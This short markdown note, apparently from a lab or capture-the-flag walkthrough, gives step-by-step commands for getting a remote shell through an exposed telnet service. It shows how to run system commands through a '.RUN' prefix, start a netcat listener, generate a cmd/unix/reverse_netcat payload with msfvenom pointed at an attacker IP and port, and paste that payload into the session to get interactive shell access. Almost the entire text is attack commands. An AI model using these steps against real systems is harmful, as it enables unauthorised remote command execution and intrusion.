# Exploiting Telnet

1. Connect 
```sh
telnet 10.10.10.10 2121
```

2. Send Commands
```sh
.RUN ping 10.10.10.10
Debug system commands using `tcpdump` in another tab
```sh
sudo tcpdump ip proto \\icmp -i eth0
```

3. Start Netcat Listener
```sh
nc -lvp 4444
```

4. Generate payload

`-p` - Payload
`lhost` - Attacker ip
`lport` - Attacker port
`R` - Raw Format

```sh
msfvenom -p cmd/unix/reverse_netcat lhost=10.10.10.10 lport=4444 R
```

5. Upload payload
This can be done by copy-pasting into the telnet terminal

6. Issue commands from `nc` session
In the same window you started the nc listener you can issue regular system commands such as `ls` and `cat`
